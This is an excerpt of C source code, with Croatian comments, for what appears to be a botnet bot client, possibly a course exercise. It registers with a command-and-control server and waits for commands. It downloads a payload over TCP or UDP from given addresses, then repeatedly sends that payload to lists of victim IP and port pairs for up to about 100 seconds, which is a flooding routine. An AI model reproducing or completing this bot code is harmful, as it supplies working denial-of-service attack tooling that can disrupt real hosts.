...
void job(char *addr, char *port) {
    ...
    while (1) {
        ...
        if (command->command == '1')
            command1(numPairs, payload, buf, &payloadInit);
...
int reg(char *addr, char *port, struct addrinfo **res) {
    ...
    int sock = Socket(res1->ai_family, res1->ai_socktype, res1->ai_protocol, 3, FATAL,
                      "Could not complete socket creation");
    Setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on), 7, FATAL,
               "Setsockopt SO_BROADCAST failed for command 2");
...
int recvMSG(int sock, char *buf, size_t nrecv) {
    ssize_t nread = Recvfrom(sock, buf, nrecv, 0, NULL, NULL, 5, FATAL,
...
void command1(int numPairs, char *payload, char *buf, bool *payloadInit) { // ovdje SO_BROADCAST IMA SMISLA SAMO ZA UDP
    if (numPairs < 1)
        err(6, "Command 1 received but less than 1 pair given");
    ...
    GetTCP_addrinfo(command->pairs[0].ip, command->pairs[0].port, &res, 0,
                    2, WARN, "Getaddrinfo for command 1 failed");
    for (struct addrinfo *rp = res; rp != NULL; rp = rp->ai_next) {
        sfd = Socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol, IGNORE, DBG, "Command 1 socket failed");
        if (sfd == -1)
            continue;
        if (Connect(sfd, rp->ai_addr, rp->ai_addrlen, IGNORE, DBG, "Command 1 connect failed") != -1)
            break;                  /* Success */
        close(sfd);
    }
    ...
    ssize_t nrec = -1;
    if (r >= 0)
        nrec = Recv(sfd, (void *) payload, PAYLOAD_LEN - 1, 0, IGNORE, WARN, "Command 1 recv failed");
    if (nrec >= 0) {
        payload[nrec] = '\0';
        *payloadInit = true;
    }
...
void command2(int numPairs, char *payload, char *buf, bool *payloadInit, int sock) {
    if (numPairs < 1)
        err(6, "Command 2 received but less than 1 pair given");
    ...
    if (sock != -1) {
        ssize_t r = Sendto(sock, toSend, strlen(toSend), 0, res->ai_addr, res->ai_addrlen, IGNORE,
                           WARN, "Send to command 2 failed");
        ssize_t nrec = -1;
        if (r >= 0)
            nrec = Recvfrom(sock, (void *) payload, 1024, 0, 0, NULL, IGNORE, WARN,
                            "Recv from command 2 failed");
        if (nrec >= 0) {
            payload[nrec] = '\0';
            *payloadInit = true;
        }
...
void command3(struct addrinfo *cic_ai, int sock, int numPairs, bool payloadInit, char *buf, char *payload) {
    ...
    struct MSG *command = (struct MSG *) buf;
    for (int i = 0; i < numPairs; i++)
        GetUDP_addrinfo(command->pairs[i].ip, command->pairs[i].port, (results + i), 0, 2,
                        DBG, "getAddrInfo failed for given pair");
...
void command3Send(struct addrinfo *cic_ai, int sock, int numPairs, struct addrinfo **results, char *payload) {
    ...
    for (int numSec = 1; numSec < 100;) {
        ssize_t recvRes = Recvfrom(sock, &msgBuf, sizeof(char), 0, (struct sockaddr *) &addr, &sizeSockAddr, IGNORE,
                                   DBG,
                                   "Failed or partial read command 3"); // TODO usporedi je li doslo od C&C ili od zrtve ili netko treci?
        if (recvRes >= 0 &&
            checkWhoAnswered(cic_ai, (struct sockaddr *) &addr, sizeSockAddr, msgBuf, numPairs, results)) // ili > 0??
			break;
...
void command3SendOne(int numPairs, char *payload, struct addrinfo **results, int sock) {
    ...
    while ((nextLen = nextPayloadPart((payload) + sumLen)) != -1) {
        for (int i = 0; i < numPairs; i++) {
            Sendto(sock, (payload + sumLen), nextLen, 0, results[i]->ai_addr, results[i]->ai_addrlen, 4,
                   DBG, "Failed to send payload to given pair");
        }
